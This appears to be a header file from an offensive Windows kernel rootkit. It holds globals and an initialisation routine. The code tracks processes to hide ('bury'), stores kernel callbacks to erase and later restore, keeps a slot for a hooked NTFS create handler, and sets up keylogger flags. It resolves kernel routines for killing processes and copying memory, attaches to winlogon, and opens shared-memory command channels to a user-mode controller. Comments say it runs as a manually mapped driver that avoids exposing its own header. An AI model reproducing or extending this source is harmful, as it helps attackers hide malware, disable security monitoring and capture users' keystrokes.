#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "WinTypes.hpp"
#include "Vector.hpp"

typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL);
typedef NTSTATUS(*OBREFERENCEOBJECTBYNAME)(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);

namespace BeGlobals
{
    PVOID NtOsKrnlAddr;
    PVOID Win32kBaseAddr;
    PDRIVER_OBJECT diskDriverObject;

    OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;
    ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation;

    HANDLE winLogonPid;
    PEPROCESS winLogonProc;
}

#include "Misc.hpp"

namespace BeGlobals
{
    // For communication with the userland process
    HANDLE hSharedMemory = NULL;
    PVOID pSharedMemory = NULL;
    HANDLE commandEvent, answerEvent = NULL;
}

#include "MemoryUtils.hpp"
#include "AddressUtils.hpp"
#include "AutoLock.hpp"

#define MAX_BURIED_PROCESSES 256
#define MAX_ERASE_CALLBACKS 256

typedef struct _WCHAR_ARRAY {
    WCHAR* array[MAX_BURIED_PROCESSES];
    INT length;
} WCHAR_ARRAY;

typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
    LONG64 addrOfCallbackFunction[MAX_ERASE_CALLBACKS];
    LONG64 callbackToRestore[MAX_ERASE_CALLBACKS];
    CALLBACK_TYPE callbackType[MAX_ERASE_CALLBACKS];
    INT length;
} KERNEL_CALLBACK_RESTORE_INFO_ARRAY;

typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);

// Function Prototypes
typedef NTSTATUS(*IOCREATEDRIVER)(PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);
typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
typedef NTSTATUS(*ZWPROTECTVIRTUALMEMORY)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
typedef NTSTATUS(*MMCOPYVIRTUALMEMORY)(IN PEPROCESS SourceProcess, IN PVOID SourceAddress, IN PEPROCESS TargetProcess, OUT PVOID TargetAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T ReturnSize);
typedef NTSTATUS(*PSSETCREATEPROCESSNOTIFYROUTINEEX)(IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, IN BOOLEAN Remove);

namespace BeGlobals
{
    WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
    KERNEL_CALLBACK_RESTORE_INFO_ARRAY beCallbacksToRestore = { { NULL }, { NULL }, { CallbackTypeNone }, 0 };

    // Mutexes
    FastMutex processListLock = FastMutex();
    FastMutex callbackLock = FastMutex();

    NTFS_IRP_MJ_CREATE_FUNCTION originalNTFS_IRP_MJ_CREATE_function = NULL;

    ZWTERMINATEPROCESS pZwTerminateProcess;
    ZWOPENPROCESS pZwOpenProcess;
    ZWCLOSE pZwClose;
    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
    PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;

    bool shutdown = false;
    bool logKeys = false;

    KEVENT hKeyLoggerTerminationEvent;
    KEVENT hMainLoopTerminationEvent;

    NTSTATUS
    BeInitGlobals()
    {
        // We need this to resolve the base addr of modules ... TODO FIXME dont use MmGetSystemRoutine ...
        UNICODE_STRING usObRefByName = RTL_CONSTANT_STRING(L"ObReferenceObjectByName");
        pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)MmGetSystemRoutineAddress(&usObRefByName);

        if (!pObReferenceObjectByName)
        {
            LOG_MSG("Failed to resolve ObReferenceObjectByName\n");
            return STATUS_NOT_FOUND;
        }

        // Since we are using a mapped driver, we should not try to access the header of our driver
        // instead we use the DISK driver as an object any time we need to access the header
        UNICODE_STRING DriverName = RTL_CONSTANT_STRING(L"\\Driver\\disk");
        NTSTATUS status = BeGlobals::pObReferenceObjectByName(
            &DriverName,
            OBJ_CASE_INSENSITIVE,
            NULL,
            0,
            *IoDriverObjectType,
            KernelMode,
            NULL,
            (PVOID*)&BeGlobals::diskDriverObject
        );

        if (!NT_SUCCESS(status))
        {
            LOG_MSG("Failure on ObReferenceObjectByName\n");
            return status;
        }

        // Get base address of modules
        NtOsKrnlAddr = BeGetBaseAddrOfModule(L"ntoskrnl.exe");
        Win32kBaseAddr = BeGetBaseAddrOfModule(L"win32kbase.sys");
        LOG_MSG("ntoskrnl.exe base addr:0x%llx\n", (UINT64)NtOsKrnlAddr);
        LOG_MSG("Win32kbase.sys base addr:0x%llx\n", (UINT64)Win32kBaseAddr);

        // init locks
        processListLock.Init();
        callbackLock.Init();

        // Function resolving
        pZwTerminateProcess = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress(NtOsKrnl, "ZwTerminateProcess");
        pZwOpenProcess = (ZWOPENPROCESS)BeGetSystemRoutineAddress(NtOsKrnl, "ZwOpenProcess");
        pZwClose = (ZWCLOSE)BeGetSystemRoutineAddress(NtOsKrnl, "ZwClose");
        pZwProtectVirtualMemory = (ZWPROTECTVIRTUALMEMORY)BeGetSystemRoutineAddress(NtOsKrnl, "ZwProtectVirtualMemory");
        pMmCopyVirtualMemory = (MMCOPYVIRTUALMEMORY)BeGetSystemRoutineAddress(NtOsKrnl, "MmCopyVirtualMemory");
        // pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)BeGetSystemRoutineAddress(NtOsKrnl, "ObReferenceObjectByName");
        pZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)BeGetSystemRoutineAddress(NtOsKrnl, "ZwQuerySystemInformation");
        pPsSetCreateProcessNotifyRoutineEx = (PSSETCREATEPROCESSNOTIFYROUTINEEX)BeGetSystemRoutineAddress(NtOsKrnl, "PsSetCreateProcessNotifyRoutineEx");
        if (!pZwTerminateProcess || !pZwOpenProcess || !pZwClose || !pZwProtectVirtualMemory || !pMmCopyVirtualMemory || !pZwQuerySystemInformation || !pPsSetCreateProcessNotifyRoutineEx)
        {
            LOG_MSG("Failed to resolve one or more functions\n");
            return STATUS_NOT_FOUND;
        }
        LOG_MSG("Resolved functions\n");

        //  Get winlogon PID to enable attaching to session space
        UNICODE_STRING processName;
        RtlInitUnicodeString(&processName, L"winlogon.exe");
        winLogonPid = BeGetPidFromProcessName(processName);
        LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(winLogonPid));
        if (PsLookupProcessByProcessId(winLogonPid, &winLogonProc))
        {
            ObDereferenceObject(winLogonProc);
            return STATUS_NOT_FOUND;
        }

        // Setup shared memory for interprocess communications
        UNICODE_STRING commandEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeCommandEvt");
        UNICODE_STRING answerEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\Global\\BeAnswerEvt");
        BeCreateNamedEvent(&commandEvent, &commandEventName, FALSE);
        BeCreateNamedEvent(&answerEvent, &answerEventName, FALSE);
        LOG_MSG("Created events\n");

        BeCreateSharedMemory();
        LOG_MSG("Created shared memory\n");

        KeInitializeEvent(&BeGlobals::hKeyLoggerTerminationEvent, NotificationEvent, FALSE);
        KeInitializeEvent(&BeGlobals::hMainLoopTerminationEvent, NotificationEvent, FALSE);
        LOG_MSG("Initialised termination events\n");

        return STATUS_SUCCESS;
    }
}

